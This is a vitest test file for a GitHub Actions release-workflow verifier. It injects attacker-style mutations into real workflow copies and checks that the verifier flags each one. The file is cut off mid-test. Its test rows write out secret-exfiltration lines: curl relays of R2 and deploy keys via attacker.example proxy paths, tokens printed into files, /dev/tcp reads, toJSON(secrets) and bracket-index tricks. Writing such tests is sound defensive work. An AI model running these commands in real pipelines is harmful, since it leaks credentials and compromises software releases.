// SPDX-License-Identifier: MIT

// The reviewers' cases against the REAL workflows (#794 review, rounds 4–5):
// each mutates a copy of sdk-publish.yml or cli-release.yml the way an
// attacker or a mistake would, and the real verifier, with the real settings,
// manifest and per-environment command table, must report a new finding.

import { cpSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { parse as parseYaml } from "yaml";
import { afterAll, describe, expect, it } from "vitest";
import {
  ACTION_SURFACE,
  DAGGER_SETUP,
  CREDENTIAL_ACTION_OUTPUTS,
  ACTION_OUTPUTS,
  CREDENTIAL_ENV,
  isCredentialed,
  writesOf,
  readsCredentialContext,
  FROZEN_JOBS,
  FROZEN_WORKFLOW_KEYS,
  daggerFnFindings,
  referenceProblem,
  ENVIRONMENT_COMMANDS,
  MANIFEST,
  PINNED_ENV,
  commandName,
  SETTINGS,
  WORKFLOWS,
  allFindings,
  readLocalActions,
  readScriptOutputs,
  referenceFindings,
  surfaceFindings,
  exemptTokenFindings,
  idTokenExceptionFindings,
  ID_TOKEN_EXCEPTIONS,
  verifyWorkflows,
} from "./verify-workflows.mjs";
import { lexStrict } from "./strict-shell.mjs";
import { rowSnapshots } from "./row-snapshots.mjs";

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), "..", "..");
const settings = JSON.parse(readFileSync(join(ROOT, SETTINGS), "utf8"));
const manifest = JSON.parse(readFileSync(join(ROOT, MANIFEST), "utf8"));
const BASE = {};
for (const f of readdirSync(join(ROOT, WORKFLOWS)).filter((n) => /\.ya?ml$/.test(n)))
  BASE[f] = parseYaml(readFileSync(join(ROOT, WORKFLOWS, f), "utf8"));
const P = "sdk-publish.yml";
const SCRIPTS = readScriptOutputs(ROOT);
const ACTIONS = readLocalActions(ROOT);
const C = "cli-release.yml";

const all = (w) =>
  allFindings({ settings, manifest, workflows: w, scriptOutputs: SCRIPTS, actions: ACTIONS }).map(
    (f) => `${f.file}: ${f.job}: ${f.why}`,
  );
/** The findings `mutate` adds to the real tree, which itself has none. */
function added(mutate) {
  const w = structuredClone(BASE);
  mutate(w);
  return all(w);
}
const inject = (w, file, job, s) =>
  w[file].jobs[job].steps.splice(1, 0, { name: "injected", ...s });
/** Append `line` to the run block of the step whose env names `needle`. */
const append = (w, file, job, needle, line) => {
  const s = w[file].jobs[job].steps.find(
    (x) => typeof x.run === "string" && x.env && needle in x.env,
  );
  if (s === undefined) throw new Error(`no step of ${job} with ${needle} in its env`);
  s.run = `${s.run}\n${line}\n`;
};

/** Each refuses row's findings, snapshotted (row-snapshots.mjs). */
const ROWS = rowSnapshots("row-findings.json");
const expectFindings = (label, got) => ROWS.check(label, got);
afterAll(() => ROWS.finish());

describe("the real release workflows", () => {
  it("have no finding", () => expect(all(BASE)).toEqual([]));
});

describe("a credential leaves no job through curl or a file (round 5, HIGH)", () => {
  const RELAY = (name) =>
    `curl -fsS --proto =https --tlsv1.2 "https://proxy.golang.org/attacker.example/\${${name}}/@v/list"`;
  it.each(
    ROWS.rows([
      [
        "H1 maven: a proxy relay of MAVEN_R2_SECRET_ACCESS_KEY",
        (w) =>
          append(
            w,
            P,
            "publish-maven",
            "MAVEN_R2_SECRET_ACCESS_KEY",
            RELAY("MAVEN_R2_SECRET_ACCESS_KEY"),
          ),
        /curl is not a command environment sdk-publish-maven's job runs|credential/,
      ],
      [
        "H2 cli upload: a proxy relay of R2_SECRET_ACCESS_KEY",
        (w) => append(w, C, "upload", "R2_SECRET_ACCESS_KEY", RELAY("R2_SECRET_ACCESS_KEY")),
        /credential R2_SECRET_ACCESS_KEY outside its recorded position/,
      ],
      [
        "H3 cli promote: a proxy relay of two keys",
        (w) =>
          append(
            w,
            C,
            "promote",
            "R2_SECRET_ACCESS_KEY",
            'curl -fsS "https://proxy.golang.org/attacker.example/${R2_ACCESS_KEY_ID}/${R2_SECRET_ACCESS_KEY}/@v/list"',
          ),
        /credential R2_ACCESS_KEY_ID outside/,
      ],
      [
        "H5 maven: the secret printed into publish-tmp",
        (w) =>
          append(
            w,
            P,
            "publish-maven",
            "MAVEN_R2_SECRET_ACCESS_KEY",
            "printf '%s\\n' \"${MAVEN_R2_SECRET_ACCESS_KEY}\" > publish-tmp/k",
          ),
        /credential MAVEN_R2_SECRET_ACCESS_KEY outside/,
      ],
      [
        "N1 crates: the OIDC token printed into publish-tmp",
        (w) => {
          const s = w[P].jobs["publish-crates"].steps.find((x) => x.name === "Upload");
          s.run = "printf '%s\\n' \"${CARGO_REGISTRY_TOKEN}\" > publish-tmp/leak\n" + s.run;
        },
        /credential CARGO_REGISTRY_TOKEN outside/,
      ],
      [
        "go: a relay of the deploy key, though curl is the Go job's",
        (w) =>
          append(
            w,
            P,
            "publish-go",
            "DEPLOY_KEY",
            'curl -fsS "https://proxy.golang.org/github.com/confeature/sdks/apps/sdk-go/@v/${DEPLOY_KEY}"',
          ),
        /credential DEPLOY_KEY outside/,
      ],
      [
        "go: an expansion before /@v/",
        (w) =>
          inject(w, P, "publish-go", {
            run: 'curl -fsS "https://proxy.golang.org/${UNIT_VERSION}/x/@v/list"',
          }),
        /curl reaches only .*, exactly/,
      ],
      [
        "go: another module on the proxy",
        (w) =>
          inject(w, P, "publish-go", {
            run: 'curl -fsS "https://proxy.golang.org/attacker.example/x/@v/list"',
          }),
        /curl reaches only .*, exactly/,
      ],
      [
        "npm: curl outside the Go job",
        (w) =>
          inject(w, P, "publish-npm", {
            run: 'curl -fsS "https://proxy.golang.org/github.com/confeature/sdks/apps/sdk-go/@v/list"',
          }),
        /curl is not a command environment sdk-publish-npm's job runs/,
      ],
      [
        "npm: git outside the git jobs",
        (w) =>
          inject(w, P, "publish-npm", {
            run: "git push git@github.com:confeature/sdks.git HEAD:refs/heads/x",
          }),
        /git is not a command environment sdk-publish-npm's job runs/,
      ],
      [
        "nuget: a credential that is not a deploy key, written as one",
        (w) =>
          append(
            w,
            P,
            "publish-nuget",
            "NUGET_API_KEY",
            "printf '%s\\n' \"$NUGET_API_KEY\" > publish-tmp/ssh/key",
          ),
        /credential NUGET_API_KEY outside/,
      ],
      [
        "packagist: the deploy key written anywhere but its file",
        (w) =>
          append(
            w,
            P,
            "publish-packagist",
            "DEPLOY_KEY",
            "printf '%s\\n' \"$DEPLOY_KEY\" > publish-tmp/copy",
          ),
        /credential DEPLOY_KEY outside/,
      ],
      [
        "a credential through env.: a step env that copies one",
        (w) => {
          const s = w[P].jobs["publish-nuget"].steps.find((x) => x.name === "Upload");
          s.env = { ...s.env, COPY: "${{ env.NUGET_API_KEY }}" };
          s.run += "\nprintf '%s\\n' \"$COPY\"\n";
        },
        /credential COPY outside/,
      ],
    ]),
  )("%s", (label, mutate, why) => {
    const got = added(mutate);
    expectFindings(label, got);
    expect(
      got.some((g) => why.test(g)),
      got.join("\n"),
    ).toBe(true);
  });
});

describe("ENVIRONMENT_COMMANDS lists exactly what each job runs", () => {
  it("every listed command is used by its environment's real job (an unused allowance is a hole)", () => {
    const used = new Map();
    for (const f of [P, C])
      for (const job of Object.values(BASE[f].jobs)) {
        const named = typeof job.environment === "string" ? job.environment : job.environment?.name;
        const id = Object.entries(BASE[f].jobs).find(([, x]) => x === job)[0];
        const env =
          named ?? (ENVIRONMENT_COMMANDS[`${f}#${id}`] !== undefined ? `${f}#${id}` : undefined);
        if (env === undefined) continue;
        if (!used.has(env)) used.set(env, new Set());
        for (const s of job.steps ?? [])
          if (typeof s.run === "string")
            for (const c of lexStrict(s.run).commands) {
              const name = commandName(c);
              if (name !== undefined) used.get(env).add(name);
            }
      }
    for (const [env, cmds] of Object.entries(ENVIRONMENT_COMMANDS))
      expect(
        cmds.filter((c) => !used.get(env)?.has(c)),
        env,
      ).toEqual([]);
    expect([...used.keys()].filter((e) => !(e in ENVIRONMENT_COMMANDS))).toEqual([]);
  });
});

describe("16 every expression reference names something (round 5)", () => {
  const job = (w, id) => w[P].jobs[id];
  it.each(
    ROWS.rows([
      [
        "a renamed setup output (the UNIT_PATH bug's other door)",
        (w) => {
          const o = job(w, "setup").outputs;
          o.unitPath = o.path;
          delete o.path;
        },
        /needs\.setup\.outputs\.path: job setup has no output path/,
      ],
      [
        "a need the job does not declare",
        (w) => {
          job(w, "publish-crates").env.UNIT_PATH = "${{ needs.pack-npm.outputs.file }}";
        },
        /publish-crates does not need pack-npm/,
      ],
      [
        "a step output of a later step",
        (w) => {
          const s = job(w, "publish-crates").steps;
          s[0].with = { ...s[0].with, x: "${{ steps.auth.outputs.token }}" };
        },
        /no earlier step of publish-crates has id auth/,
      ],
      [
        "an env name nothing defines",
        (w) => {
          job(w, "pack-npm").steps.find((s) => s.uses?.startsWith("actions/setup-node")).with[
            "node-version"
          ] = "${{ env.NODE_VER }}";
        },
        /no env: in scope defines NODE_VER/,
      ],
      [
        "an input the workflow does not declare",
        (w) => {
          job(w, "setup").steps.find((s) => s.id === "resolve").env.UNIT = "${{ inputs.unitName }}";
        },
        /declares no input unitName/,
      ],
      [
        "a job if: on an undeclared need",
        (w) => {
          job(w, "publish-npm").if = "needs.pack-pypi.result == 'success'";
        },
        /publish-npm does not need pack-pypi/,
      ],
      [
        "cli-release: an output the release job does not declare",
        (w) => {
          w[C].jobs.upload.steps.find((s) => s.env?.EXPECTED).env.EXPECTED =
            "${{ needs.build.outputs.digest }}";
        },
        /job build has no output digest/,
      ],
    ]),
  )("refuses %s", (label, mutate, why) => {
    const got = added(mutate);
    expectFindings(label, got);
    expect(
      got.some((g) => why.test(g)),
      got.join("\n"),
    ).toBe(true);
  });
});

describe("the gate itself runs rule 16", () => {
  it("verifyWorkflows reports a renamed setup output in a copy of the repository", () => {
    const dir = mkdtempSync(join(tmpdir(), "release-workflows-"));
    try {
      for (const rel of [SETTINGS, MANIFEST, WORKFLOWS, "tools/sdk-pack/resolve-publish.mjs"])
        cpSync(join(ROOT, rel), join(dir, rel), { recursive: true });
      const f = join(dir, WORKFLOWS, P);
      writeFileSync(
        f,
        readFileSync(f, "utf8").replace(
          "      path: ${{ steps.resolve.outputs.path }}",
          "      unitPath: ${{ steps.resolve.outputs.path }}",
        ),
      );
      expect(verifyWorkflows(dir).map((x) => x.why)).toContainEqual(
        expect.stringMatching(/needs\.setup\.outputs\.path: job setup has no output path/),
      );
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("the values an exception trusts are pinned (round 5, MED)", () => {
  const stepWith = (w, file, job, pred) => w[file].jobs[job].steps.find(pred);
  it.each(
    ROWS.rows([
      [
        "N2 a step-level UNIT_PATH on the cargo step",
        (w) => {
          const s = stepWith(w, P, "publish-crates", (x) => x.name === "Upload");
          s.env = { ...s.env, UNIT_PATH: "publish-tmp/evil" };
        },
        /UNIT_PATH is publish-tmp\/evil, not its pinned expression/,
      ],
      [
        "N2b a literal job-level UNIT_PATH",
        (w) => {
          w[P].jobs["publish-crates"].env.UNIT_PATH = "publish-tmp/evil";
        },
        /UNIT_PATH is publish-tmp\/evil, not its pinned expression/,
      ],
      [
        "H4 UNIT_PATH to publish-tmp plus the token in a forged crate",
        (w) => {
          const s = stepWith(w, P, "publish-crates", (x) => x.name === "Upload");
          s.env = { ...s.env, UNIT_PATH: "publish-tmp/evil" };
          s.run =
            "printf '%s\\n' \"${CARGO_REGISTRY_TOKEN}\" > publish-tmp/evil/src/lib.rs\n" + s.run;
        },
        /not its pinned expression|credential CARGO_REGISTRY_TOKEN/,
      ],
      [
        "T1 cli upload: a step-level TAG",
        (w) => {
          const s = stepWith(
            w,
            C,
            "upload",
            (x) => typeof x.run === "string" && x.run.includes("publish-r2"),
          );
          s.env = { ...s.env, TAG: "cli-v0.0.1" };
        },
        /TAG is cli-v0\.0\.1, not its pinned expression/,
      ],
      [
        "T2 cli upload: a job-level TAG",
        (w) => {
          w[C].jobs.upload.env = { ...(w[C].jobs.upload.env ?? {}), TAG: "cli-v0.0.1" };
        },
        /TAG is cli-v0\.0\.1, not its pinned expression/,
      ],
      [
        "N10 a TAG from the event's commit message",
        (w) => {
          const s = stepWith(
            w,
            C,
            "upload",
            (x) => typeof x.run === "string" && x.run.includes("publish-r2"),
          );
          s.env = { ...s.env, TAG: "${{ github.event.head_commit.message }}" };
        },
        /TAG is \$\{\{ github\.event\.head_commit\.message \}\}, not its pinned expression/,
      ],
      [
        "a step that redefines its job's value with the same expression",
        (w) => {
          const s = stepWith(w, P, "publish-crates", (x) => x.name === "Upload");
          s.env = { ...s.env, UNIT_PATH: "${{ needs.setup.outputs.path }}" };
        },
        /redefines the job's UNIT_PATH/,
      ],
      [
        "an artifact name from another output",
        (w) => {
          w[P].jobs["publish-npm"].env.ARTIFACT = "${{ needs.pack-npm.outputs.sha256 }}";
        },
        /ARTIFACT is .*, not its pinned expression/,
      ],
    ]),
  )("refuses %s", (label, mutate, why) => {
    const got = added(mutate);
    expectFindings(label, got);
    expect(
      got.some((g) => why.test(g)),
      got.join("\n"),
    ).toBe(true);
  });
});

describe("git's configuration isolation sits on the git steps (round 5)", () => {
  it.each(
    ROWS.rows([
      [
        "publish-go sets GIT_CONFIG_GLOBAL at job level, which checkout inherits",
        (w) => {
          w[P].jobs["publish-go"].env.GIT_CONFIG_GLOBAL = "/dev/null";
        },
        /GIT_CONFIG_GLOBAL is set in the job's env, which actions\/checkout inherits/,
      ],
      [
        "the workflow env sets GIT_CONFIG_NOSYSTEM",
        (w) => {
          w[P].env.GIT_CONFIG_NOSYSTEM = "1";
        },
        /GIT_CONFIG_NOSYSTEM is set in the workflow's env/,
      ],
      [
        "a mirror's git step without the isolation",
        (w) => {
          const s = w[P].jobs["publish-packagist"].steps.find((x) => x.name === "Upload");
          delete s.env.GIT_CONFIG_GLOBAL;
        },
        /step Upload runs git without GIT_CONFIG_GLOBAL: \/dev\/null/,
      ],
      [
        "the Go push with GIT_CONFIG_NOSYSTEM off",
        (w) => {
          w[P].jobs["publish-go"].steps.find((x) => x.name === "Upload").env.GIT_CONFIG_NOSYSTEM =
            "0";
        },
        /runs git without GIT_CONFIG_NOSYSTEM: 1|points every tool at another configuration/,
      ],
    ]),
  )("refuses %s", (label, mutate, why) => {
    const got = added(mutate);
    expectFindings(label, got);
    expect(
      got.some((g) => why.test(g)),
      got.join("\n"),
    ).toBe(true);
  });
});

describe("the reviewers' round-4 driver cases, each refused for its own reason", () => {
  // Injected into a job whose command table allows the command, so the row
  // fails on its own rule, never on "not a command this job runs" (round 6).
  const s = (job, step) => (w) => inject(w, P, job, { name: "injected", ...step });
  const PRINTF = /printf takes no option/;
  const INPUT = /reads input only from publish-tmp\/ or a path this job downloads to/;
  const OPX = /an operator expansion \(\$\{NAME…\}\) is allowed only in a recorded exception/;
  it.each(
    ROWS.rows([
      ["P1 printf '-v' X y", s("publish-maven", { run: "printf '-v' X y" }), PRINTF],
      ["P2 printf '-vHOME' x", s("publish-maven", { run: "printf '-vHOME' x" }), PRINTF],
      ['P3 printf "-v" X y', s("publish-maven", { run: 'printf "-v" X y' }), PRINTF],
      ["P3b printf -v'' X y", s("publish-maven", { run: "printf -v'' X y" }), PRINTF],
      [
        "M1 job env NPM_VERSION npm:evil",
        (w) => {
          w[P].jobs["publish-npm"].env.NPM_VERSION = "npm:evil@1.0.0";
        },
        /env NPM_VERSION redefines the workflow's NPM_VERSION/,
      ],
      [
        "M2 step env RUST_VERSION",
        s("publish-crates", { run: "echo x", env: { RUST_VERSION: "nightly" } }),
        /env RUST_VERSION redefines the workflow's RUST_VERSION/,
      ],
      [
        "M3 step env TAG",
        s("publish-crates", { run: "echo x", env: { TAG: "evil" } }),
        /TAG is evil, not its pinned expression/,
      ],
      [
        "M4 job env MAVEN_URL",
        (w) => {
          w[P].jobs["publish-maven"].env = {
            ...(w[P].jobs["publish-maven"].env ?? {}),
            MAVEN_URL: "https://evil.example",
          };
        },
        /env MAVEN_URL redefines the workflow's MAVEN_URL/,
      ],
      ["L1 sort < /dev/tcp", s("publish-maven", { run: "sort < /dev/tcp/evil.example/80" }), INPUT],
      [
        "N3 GIT_CONFIG_GLOBAL=publish-tmp/gc",
        s("publish-maven", { run: "echo x", env: { GIT_CONFIG_GLOBAL: "publish-tmp/gc" } }),
        /sets GIT_CONFIG_GLOBAL, which points every tool at another configuration/,
      ],
      [
        "N3c GIT_CONFIG_COUNT",
        s("publish-maven", { run: "echo x", env: { GIT_CONFIG_COUNT: "1" } }),
        /sets GIT_CONFIG_COUNT, which CREDENTIALED_ENV does not allow/,
      ],
      [
        "N3d workflow env BASH_ENV",
        (w) => {
          w[P].env.BASH_ENV = "publish-tmp/rc";
        },
        /sets BASH_ENV, which CREDENTIALED_ENV does not allow/,
      ],
      [
        "N3e workflow env GIT_CONFIG_GLOBAL",
        (w) => {
          w[P].env.GIT_CONFIG_GLOBAL = "publish-tmp/gc";
        },
        /GIT_CONFIG_GLOBAL is set in the workflow's env|sets GIT_CONFIG_GLOBAL, which points/,
      ],
      [
        "N3f workflow env CURL_HOME",
        (w) => {
          w[P].env.CURL_HOME = "publish-tmp";
        },
        /sets CURL_HOME, which CREDENTIALED_ENV does not allow/,
      ],
      [
        "N3g step env HOME",
        s("publish-maven", { run: "echo x", env: { HOME: "/dev/null" } }),
        /sets HOME, which points every tool at another configuration/,
      ],
      [
        'N4 sort < "${TAG:-/dev/tcp/h/80}"',
        s("publish-maven", { run: 'sort < "${TAG:-/dev/tcp/h/80}"' }),
        /a redirection target must be a literal path/,
      ],
      [
        "N4b curl with an operator expansion",
        s("publish-go", { run: 'curl -fsS --proto =https "https://proxy.golang.org/${TAG:-x}"' }),
        OPX,
      ],
      ['N4c echo "${TAG:-x}"', s("publish-maven", { run: 'echo "${TAG:-x}"' }), OPX],
      [
        "N5 sha256sum < release/x where the job downloads to dist/",
        (w) =>
          inject(w, C, "upload", {
            name: "injected",
            run: "sha256sum --check --strict < release/x",
          }),
        INPUT,
      ],
      [
        "N5b sort < dist/x where the job downloads to release/",
        s("publish-maven", { run: "sort < dist/x" }),
        INPUT,
      ],
      [
        "N6 npm publishing a forged package.json from publish-tmp",
        s("publish-npm", {
          run: "npm publish --access public --provenance --ignore-scripts ./publish-tmp/p",
        }),
        /npm publish uploads only \.\/release\/\$\{ARTIFACT\}/,
      ],
      [
        "N7 git push from the npm job",
        s("publish-npm", { run: "git push git@github.com:confeature/sdks.git HEAD:refs/heads/x" }),
        /git is not a command environment sdk-publish-npm's job runs/,
      ],
      [
        "N8 a quoted 'if'",
        s("publish-maven", { run: "'if' echo x" }),
        /if is not a command a credentialed job runs/,
      ],
      [
        "N9 a comment that assigns",
        s("pack-crates", { run: '# FOO=\necho "${FOO}"' }),
        /reads \$FOO, which no env:/,
      ],
      [
        "gem pushing another file",
        s("publish-rubygems", { run: 'gem push "./release/x.gem"' }),
        /gem push uploads only/,
      ],
      [
        "dotnet pushing another file",
        s("publish-nuget", {
          run: 'dotnet nuget push "./release/x.nupkg" --source https://api.nuget.org/v3/index.json',
        }),
        /dotnet nuget push uploads only/,
      ],
    ]),
  )("refuses %s", (label, mutate, why) => {
    const got = added(mutate);
    expectFindings(label, got);
    expect(
      got.some((g) => why.test(g)),
      got.join("\n") || "no finding",
    ).toBe(true);
  });
});

describe("round 5's bypasses: a credential reaches no unpinned name, no test and no proxy path", () => {
  const PFX = "https://proxy.golang.org/github.com/confeature/sdks/apps/sdk-go/@v/";
  const SECRET = "GO_TAG_DEPLOY_KEY";
  const at =
    (job, s, i = 1) =>
    (w) =>
      w[P].jobs[job].steps.splice(i, 0, { name: "injected", ...s });
  const pre = (job, stepName, line) => (w) => {
    const s = w[P].jobs[job].steps.find((x) => x.name === stepName);
    s.run = `${line}\n${s.run}`;
  };
  const INDEX = /an index \(\[…\]\) into a context/;
  const FN = /toJSON, fromJSON, format and join are refused/;
  const PIN = /not its pinned expression/;
  const TEST = /credential DEPLOY_KEY outside its recorded position/;
  const CURL = /curl reaches only .*, exactly/;
  it.each(
    ROWS.rows([
      [
        "E1 [ -n K -a -n K ]",
        pre(
          "publish-go",
          "Install the deploy key",
          '[ -n "$DEPLOY_KEY" -a -n "$DEPLOY_KEY" ] && echo y',
        ),
        TEST,
      ],
      [
        "E2 [ -n K = abc ]",
        pre(
          "publish-go",
          "Install the deploy key",
          'if [ -n "$DEPLOY_KEY" = abc ]; then echo y; fi',
        ),
        TEST,
      ],
      [
        "E3 [ abc \\< -n -o -n K ]",
        pre(
          "publish-go",
          "Install the deploy key",
          'if [ abc \\< -n -o -n "$DEPLOY_KEY" ]; then echo y; fi',
        ),
        /backslash outside quotes|credential DEPLOY_KEY/,
      ],
      [
        "E4 [ K ]",
        pre("publish-go", "Install the deploy key", '[ "$DEPLOY_KEY" ] && echo y'),
        TEST,
      ],
      [
        "L10 [ -n K -a … ] in Upload",
        pre("publish-go", "Upload", '[ -n "${DEPLOY_KEY}" -a -n "${DEPLOY_KEY}" ] && echo y'),
        /credential DEPLOY_KEY outside|undefined|no env/,
      ],
      [
        "L1 secrets['X'] in an allowed name",
        at("publish-go", {
          env: { DOTNET_NOLOGO: `\${{ secrets['${SECRET}'] }}` },
          run: 'echo "${DOTNET_NOLOGO}"',
        }),
        INDEX,
      ],
      [
        "L2 toJSON(secrets)",
        at("publish-go", {
          env: { DOTNET_NOLOGO: "${{ toJSON(secrets) }}" },
          run: 'echo "${DOTNET_NOLOGO}"',
        }),
        FN,
      ],
      [
        "L3 github['token']",
        at("publish-go", {
          env: { DOTNET_NOLOGO: "${{ github['token'] }}" },
          run: 'echo "${DOTNET_NOLOGO}"',
        }),
        INDEX,
      ],
      [
        "L3b toJSON(github)",
        at("publish-go", {
          env: { DOTNET_NOLOGO: "${{ toJSON(github) }}" },
          run: 'echo "${DOTNET_NOLOGO}"',
        }),
        FN,
      ],
      [
        "L8 format('{0}', secrets.X)",
        at("publish-go", {
          env: { CLOUDFLARE_ACCOUNT_ID: `\${{ format('{0}', secrets.${SECRET}) }}` },
          run: 'echo "${CLOUDFLARE_ACCOUNT_ID}"',
        }),
        FN,
      ],
      [
        "L9 a job env bracket",
        (w) => {
          w[P].jobs["publish-go"].env.DOTNET_NOLOGO = `\${{ secrets['${SECRET}'] }}`;
        },
        INDEX,
      ],
      [
        "M1 toJSON(secrets) as R2_ACCESS_KEY_ID",
        (w) => {
          w[P].jobs["publish-go"].env.R2_ACCESS_KEY_ID = "${{ toJSON(secrets) }}";
        },
        FN,
      ],
      [
        "M2 github['token'] as CLOUDFLARE_ACCOUNT_ID",
        at("publish-go", {
          env: { CLOUDFLARE_ACCOUNT_ID: "${{ github['token'] }}" },
          run: "echo x",
        }),
        INDEX,
      ],
      [
        "M3 secrets[X] in packagist",
        at("publish-packagist", {
          env: { DOTNET_NOLOGO: `\${{ secrets['${SECRET}'] }}` },
          run: 'echo "${DOTNET_NOLOGO}"',
        }),
        INDEX,
      ],
      [
        "M4 steps['x'].outputs",
        at("publish-go", {
          env: { DOTNET_NOLOGO: "${{ steps['inj'].outputs.y }}" },
          run: 'echo "${DOTNET_NOLOGO}"',
        }),
        INDEX,
      ],
      [
        "M5 env['DEPLOY_KEY'] at job",
        (w) => {
          w[P].jobs["publish-go"].env.DOTNET_NOLOGO = "${{ env['DEPLOY_KEY'] }}";
        },
        INDEX,
      ],
      [
        "Q1 fromJSON(toJSON(secrets)).X into a tag",
        at(
          "publish-go",
          {
            env: { CLOUDFLARE_ACCOUNT_ID: "${{ fromJSON(toJSON(secrets)).SOME_ORG_SECRET }}" },
            run: 'git push --atomic --end-of-options git@github.com:confeature/sdks.git "HEAD:refs/tags/${CLOUDFLARE_ACCOUNT_ID}"',
          },
          3,
        ),
        FN,
      ],
      [
        "Q3 github['token'] in the Upload job's env",
        (w) => {
          w[P].jobs["publish-go"].env.CLOUDFLARE_ACCOUNT_ID = "${{ github['token'] }}";
        },
        INDEX,
      ],
      [
        "Q4 packagist Upload: fromJSON(toJSON(secrets)).X",
        (w) => {
          w[P].jobs["publish-packagist"].steps.find(
            (s) => s.name === "Upload",
          ).env.CLOUDFLARE_ACCOUNT_ID = "${{ fromJSON(toJSON(secrets)).X }}";
        },
        FN,
      ],
      [
        "R1 needs['x'] (rule 16)",
        (w) => {
          w[P].jobs["publish-go"].env.DOTNET_NOLOGO = "${{ needs['nosuchjob'].outputs.nothing }}";
        },
        INDEX,
      ],
      [
        "a literal value for an allowed name",
        (w) => {
          w[P].jobs["publish-nuget"].env.DOTNET_NOLOGO = "0";
        },
        PIN,
      ],
      [
        "a secret in a name pinned to a literal",
        (w) => {
          w[P].jobs["publish-nuget"].env.DOTNET_NOLOGO = "${{ secrets.MIRROR_DEPLOY_KEY }}";
        },
        PIN,
      ],
      [
        "another pack job's artifact name",
        (w) => {
          w[P].jobs["publish-npm"].env.ARTIFACT = "${{ needs.pack-pypi.outputs.file }}";
        },
        PIN,
      ],
      [
        "a bare context",
        (w) => {
          w[P].jobs["publish-go"].env.DOTNET_NOLOGO = "${{ secrets }}";
        },
        /the bare secrets context/,
      ],
      [
        "L4 ../ out of the module",
        at("publish-go", {
          run: `curl -fsS --proto =https "${PFX}../../../../../../attacker.example/x/@v/list"`,
        }),
        CURL,
      ],
      [
        "L4c a query",
        at("publish-go", { run: `curl -fsS --proto =https "${PFX}v1.info?x=1"` }),
        CURL,
      ],
      [
        "L4d %2e",
        at("publish-go", { run: `curl -fsS --proto =https "${PFX}%2e%2e/%2e%2e/x"` }),
        CURL,
      ],
      [
        "L4e @ userinfo",
        at("publish-go", { run: `curl -fsS --proto =https "${PFX}@attacker.example/"` }),
        CURL,
      ],
      [
        "the module's list, not its version",
        at("publish-go", { run: `curl -fsS --proto =https "${PFX}list"` }),
        CURL,
      ],
    ]),
  )("refuses %s", (label, mutate, why) => {
    const got = added(mutate);
    expectFindings(label, got);
    expect(
      got.some((g) => why.test(g)),
      got.join("\n") || "no finding",
    ).toBe(true);
  });
});

describe("16 a step output reference names an output the step writes (round 6)", () => {
  it.each([
    [
      "the resolver's output renamed (its script stops emitting path)",
      (w, s) => [
        w,
        {
          ...s,
          "tools/sdk-pack/resolve-publish.mjs": s["tools/sdk-pack/resolve-publish.mjs"].filter(
            (k) => k !== "path",
          ),
        },
      ],
      /steps\.resolve\.outputs\.path: tools\/sdk-pack\/resolve-publish\.mjs emits no output path/,
    ],
    [
      "a run step that does not write the name",
      (w, s) => {
        const d = w[P].jobs["pack-npm"].steps.find((x) => x.id === "digest");
        d.run = d.run.replace("sha256=", "digest=");
        return [w, s];
      },
      /steps\.digest\.outputs\.sha256: step digest writes no sha256= to \$GITHUB_OUTPUT/,
    ],
    [
      "an action output that is not recorded",
      (w, s) => {
        w[P].jobs["publish-crates"].steps.find(
          (x) => x.name === "Upload",
        ).env.CARGO_REGISTRY_TOKEN = "${{ steps.auth.outputs.secret }}";
        return [w, s];
      },
      /action rust-lang\/crates-io-auth-action offers no recorded output secret/,
    ],
  ])("refuses %s", (_, mutate, why) => {
    const [w, scripts] = mutate(structuredClone(BASE), SCRIPTS);
    const got = referenceFindings(w, scripts).map((f) => `${f.job}: ${f.why}`);
    expect(
      got.some((g) => why.test(g)),
      got.join("\n") || "no finding",
    ).toBe(true);
  });
  it("reads the resolver's emitted keys, shorthand included", () =>
    expect(SCRIPTS["tools/sdk-pack/resolve-publish.mjs"]).toEqual(
      expect.arrayContaining(["path", "version", "mirrorTag"]),
    ));
  it("F4: a run step that only mentions the name in a comment does not write it", () => {
    const w = structuredClone(BASE);
    const d = w[P].jobs["pack-npm"].steps.find((x) => x.id === "digest");
    d.run = d.run.replace(/^.*sha256=.*$/m, '          # echo "sha256=x" >> "$GITHUB_OUTPUT"');
    const got = referenceFindings(w, SCRIPTS, settings).map((f) => f.why);
    expect(got).toContainEqual(
      expect.stringMatching(/step digest writes no sha256= to \$GITHUB_OUTPUT/),
    );
  });
  it("a name written by a line that does not redirect to GITHUB_OUTPUT is no output", () => {
    const w = structuredClone(BASE);
    const d = w[P].jobs["pack-npm"].steps.find((x) => x.id === "digest");
    d.run = d.run.replace(/^(.*sha256=.*)>> "\$GITHUB_OUTPUT"$/m, '$1>> "$GITHUB_STEP_SUMMARY"');
    expect(d.run).toContain("GITHUB_STEP_SUMMARY");
    const got = referenceFindings(w, SCRIPTS, settings).map((f) => f.why);
    expect(got).toContainEqual(
      expect.stringMatching(/step digest writes no sha256= to \$GITHUB_OUTPUT/),
    );
  });
});

describe("16 reads the workflow env, secrets, vars and matrix too (round 6)", () => {
  it.each(
    ROWS.rows([
      [
        "a secret the job's environment does not declare",
        (w) => {
          w[P].jobs["publish-go"].steps.find(
            (s) => s.name === "Install the deploy key",
          ).env.DEPLOY_KEY = "${{ secrets.MIRROR_DEPLOY_KEY }}";
        },
        /environment sdk-publish-go declares no secret MIRROR_DEPLOY_KEY/,
      ],
      [
        "a secret in a job outside an environment",
        (w) => {
          w[P].jobs.setup.steps.find((s) => s.id === "resolve").env.UNIT =
            "${{ secrets.GO_TAG_DEPLOY_KEY }}";
        },
        /a job outside an environment declares no secret GO_TAG_DEPLOY_KEY/,
      ],
      [
        "a variable nobody recorded",
        (w) => {
          w[P].jobs["publish-nuget"].steps.find((s) =>
            s.uses?.startsWith("NuGet/login"),
          ).with.user = "${{ vars.OTHER }}";
        },
        /RELEASE_VARS records no variable OTHER/,
      ],
      [
        "a matrix reference",
        (w) => {
          w[P].jobs["pack-npm"].env.UNIT_VERSION = "${{ matrix.version }}";
        },
        /the release workflows use no matrix/,
      ],
      [
        "the workflow env reading a job's output",
        (w) => {
          w[P].env.EXTRA = "${{ needs.setup.outputs.path }}";
        },
        /the workflow's env cannot read the needs context/,
      ],
    ]),
  )("refuses %s", (label, mutate, why) => {
    const got = added(mutate);
    expectFindings(label, got);
    expect(
      got.some((g) => why.test(g)),
